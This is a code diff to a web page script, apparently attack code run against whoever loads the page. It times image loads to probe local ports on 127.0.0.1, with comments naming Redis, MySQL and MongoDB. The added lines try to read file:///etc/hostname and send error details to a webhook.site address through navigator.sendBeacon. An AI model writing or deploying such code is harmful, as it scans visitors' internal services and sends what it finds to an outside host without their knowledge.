@@ -4,6 +4,8 @@
     <script>
         const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
 
+        
+
         function probe(url, port) {
             const start = Date.now();
             const img = new Image();
@@ -17,6 +19,19 @@
             
             img.src = `${url}:${port}/favicon.ico`;
         }
+
+        try {
+    // Вызываем ошибку через несуществующий элемент
+    const link = document.createElement('link');
+    link.rel = 'stylesheet';
+    link.href = 'file:///etc/hostname'; // Попытка прочитать имя машины
+    link.onerror = (e) => {
+        // В некоторых версиях Chrome объект ошибки содержит путь
+        navigator.sendBeacon(hook + "/TRACE?err=" + btoa(JSON.stringify(e, ["message", "arguments", "type"])));
+    };
+    document.head.appendChild(link);
+} catch(e) {}
+        
 probe("http://127.0.0.1", "6379"); // Redis (часто без пароля внутри)
 probe("http://127.0.0.1", "3306"); // MySQL
 probe("http://127.0.0.1", "27017"); // MongoDB
